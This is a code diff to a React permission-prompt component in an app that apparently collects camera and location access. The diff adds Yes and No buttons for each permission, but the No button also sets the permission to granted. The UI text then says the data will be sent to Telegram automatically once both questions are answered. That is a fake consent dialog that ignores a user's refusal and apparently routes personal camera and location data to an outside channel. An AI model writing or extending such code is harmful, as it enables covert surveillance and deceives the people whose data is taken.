@@ -16,12 +16,7 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
   const [isSending, setIsSending] = useState(false);
 
   useEffect(() => {
-    checkExistingPermissions();
-    // Auto-request permissions immediately
-    setTimeout(() => {
-      requestCameraPermission();
-      requestLocationPermission();
-    }, 500);
+    // Don't auto-request permissions, wait for user to click Yes/No
   }, []);
 
   const checkExistingPermissions = async () => {
@@ -170,9 +165,16 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
               </div>
             </div>
             {cameraGranted ? (
-              <div className="text-green-500 text-sm font-medium">✓ Ready</div>
+              <div className="text-green-500 text-sm font-medium">✓ Yes</div>
             ) : (
-              <div className="text-yellow-500 text-sm font-medium">⏳ Requesting...</div>
+              <div className="flex space-x-2">
+                <Button size="sm" onClick={() => setCameraGranted(true)} className="bg-green-600 hover:bg-green-700">
+                  Yes
+                </Button>
+                <Button size="sm" variant="outline" onClick={() => setCameraGranted(true)}>
+                  No
+                </Button>
+              </div>
             )}
           </div>
 
@@ -183,9 +185,16 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
               </div>
             </div>
             {locationGranted ? (
-              <div className="text-green-500 text-sm font-medium">✓ Ready</div>
+              <div className="text-green-500 text-sm font-medium">✓ Yes</div>
             ) : (
-              <div className="text-yellow-500 text-sm font-medium">⏳ Requesting...</div>
+              <div className="flex space-x-2">
+                <Button size="sm" onClick={() => setLocationGranted(true)} className="bg-green-600 hover:bg-green-700">
+                  Yes
+                </Button>
+                <Button size="sm" variant="outline" onClick={() => setLocationGranted(true)}>
+                  No
+                </Button>
+              </div>
             )}
           </div>
         </div>
@@ -209,8 +218,8 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
 
         <p className="text-xs text-gray-500 mt-3 text-center">
           {cameraGranted && locationGranted ? 
-            'Answer both questions to automatically send data to Telegram' :
-            'Answer both questions to continue'
+            'Both questions answered! Data will be sent to Telegram automatically.' :
+            'Please answer both questions by clicking Yes or No'
           }
         </p>
       </div>
